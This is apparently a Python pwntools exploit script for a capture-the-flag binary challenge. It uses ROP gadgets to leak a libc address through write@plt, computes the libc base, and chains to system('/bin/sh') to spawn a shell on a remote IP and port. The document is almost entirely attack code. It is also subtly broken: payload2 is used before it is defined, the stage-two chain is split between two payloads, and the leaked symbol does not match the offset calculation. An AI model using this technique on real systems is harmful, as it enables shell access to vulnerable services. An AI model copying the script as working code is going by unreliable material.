from pwn import *
import sys


# ROP gadgets



# preload content
context.binary = "./challenge"
binary = ELF("./challenge")
libc = ELF("/mnt/root/freshnuts/pentest/ctf_wargames/OTA-University/challenges/pwn_ota/aslrtime/libc.so.6")	# ld_preload	

# plt, got, functions
libc_plt	= p64(binary.symbols["__libc_start_main"])
write_plt	= p64(binary.symbols["write"])
read_plt	= p64(binary.symbols["read"])
read_got	= p64(binary.symbols["got.read"])
main		= p64(binary.symbols["main"])
start		= 0x400470
pop_rdi = 0x4005a9
pop_rsi = 0x4005ab
pop_rdx = 0x4005ad
pop_rax = 0x4005a7
call_rax = 0x40055e

r = remote("207.148.16.237", 30002)
#r = gdb.debug("./challenge", "break *0x4005a9")
#r = process("./challenge")
#r = gdb.attach(r, "break write")

print r.recvline()


# Memleak - write@plt memleaks read@got
payload = ""
payload += "A" * 16
payload += p64(pop_rdi)
payload += p64(0x1)
payload += p64(pop_rsi)
payload += libc_plt
payload += p64(pop_rdx)
payload += p64(0x8)
payload += write_plt
payload += main





# calculate libc offsets
leak = int(r.recv(8)[::-1].encode("hex"),16)
print "[+] read.GOT leak: 0x%x" % leak
r.recvline()

libc_base = leak - libc.symbols["read"]
system = p64(libc_base + libc.symbols["system"])
binsh = p64(libc_base + libc.search("/bin/sh").next())

print_system = int(libc_base + libc.symbols["system"])
print_binsh = int(libc_base + libc.search("/bin/sh").next())

print "[+] libc: 0x%x" % libc_base
print "[+] system: 0x%x" % print_system
print "[+] binsh: 0x%x" % print_binsh



# stage 2 payload
payload2 += p64(pop_rdi)
payload += binsh
payload += system

r.sendline(payload)
r.sendline(payload2)
r.interactive()


